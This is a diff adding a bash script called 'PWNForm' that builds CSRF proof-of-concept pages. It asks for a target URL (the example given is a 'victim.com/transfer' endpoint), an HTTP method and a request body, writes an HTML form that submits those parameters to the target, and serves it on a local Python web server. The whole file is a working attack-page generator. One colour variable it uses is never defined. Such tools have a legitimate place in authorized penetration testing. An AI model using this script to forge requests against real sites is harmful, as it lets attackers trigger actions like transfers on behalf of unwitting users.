@@ -1,0 +1,115 @@
+#!/bin/bash
+
+### CSRF PoC Generator (PWNForm) ###
+
+port=8000 
+green=$(tput setaf 2)
+y=$(tput setaf 3)
+b=$(tput setaf 4)
+magenta=$(tput setaf 5)
+c=$(tput setaf 6)
+reset=$(tput sgr0)
+r=$(tput setaf 1)
+while getopts ":p:" opts; do
+  case ${opts} in
+    p) 
+	    port=$OPTARG 
+	    ;;
+   \?) 
+	    echo "Usage: $0 [-p port]"
+	    exit 1
+	    ;;
+  esac
+done
+
+shift $((OPTIND -1))
+
+cat <<EOF
+${r}   _______   __   __  ___  _____  ___    _______   ______     _______   ___      ___  ${reset}
+${r}  |   __ "\ |"  |/  \|  "|(\"   \|"  \  /"     "| /    " \   /"      \ |"  \    /"  | ${reset}
+${r}  (. |__) :)|'  /    \:  ||.\\   \    |(: ______)// ____  \ |:        | \   \  //   | ${reset}
+${r}  |:  ____/ |: /'        ||: \.   \\  | \/    | /  /    ) :)|_____/   ) /\\  \/.    | ${reset}
+${r}  (|  /      \//  /\'    ||.  \    \. | // ___)(: (____/ //  //      / |: \.        | ${reset}
+${r} /|__/ \     /   /  \\   ||    \    \ |(:  (    \        /  |:  __   \ |.  \    /:  | ${reset}
+${r}(_______)   |___/    \___| \___|\____\) \__/     \"_____/   |__|  \___)|___|\__/|___| ${reset}
+
+
+EOF
+
+read -p "${b}Enter target URL (e.g., https://victim.com/transfer) :${reset}" target_url
+
+read -p "${b}Enter request method (GET/POST) :${reset}" method
+
+read -p "${b}Paste the full request body (OR URL-encoded), then press Enter :${reset}" request_body
+
+decoded_body=$(echo -e "$(echo "$request_body" | sed 's/+/ /g; s/%/\\x/g')")
+
+param_html=""
+IFS='&' read -r -a param_array <<< "$decoded_body"
+
+for param in "${param_array[@]}"; do
+    key=$(echo "$param" | cut -d '=' -f1)
+    value=$(echo "$param" | cut -d '=' -f2-)
+    escaped_value=$(echo "$value" | sed 's/"/\&quot;/g')
+    param_html+="<label for='$key'><strong>$key:</strong></label>"
+    param_html+="<input type='text' name='$key' id='$key' value='$escaped_value'><br><br>"
+done
+
+PocFilename="csrf_poc.html"
+echo "${y}Generating CSRF PoC...${reset}"
+
+cat <<EOF > "$PocFilename"
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>PWNForm</title>
+    <style>
+        body {
+            background-color: red;
+            color: black;
+            font-family: Arial, sans-serif;
+        }
+        input[type="text"] {
+            padding: 5px;
+            margin: 5px 0;
+            width: 300px;
+        }
+        input[type="submit"] {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: black;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h1>CSRF PWNForm</h1>
+    <p>Modify the parameters if needed, then click the button to send the request.</p>
+    <form id="csrfForm" action="$target_url" method="$method">
+        $param_html
+        <input type="submit" value="Send CSRF Request">
+    </form>
+</body>
+</html>
+EOF
+
+echo "${g}CSRF PoC HTML saved as $PocFilename${reset}"
+
+if ! lsof -i :$port &>/dev/null; then
+    echo "Starting Python HTTP server on port $port..."
+    python3 -m http.server $port &
+    sleep 2
+else
+	echo "Port $port already in use..."
+fi
+
+xdg-open "http://localhost:$port/$PocFilename" &
+
+echo "${g}PoC available at http://localhost:$port/$PocFilename${reset}"
+
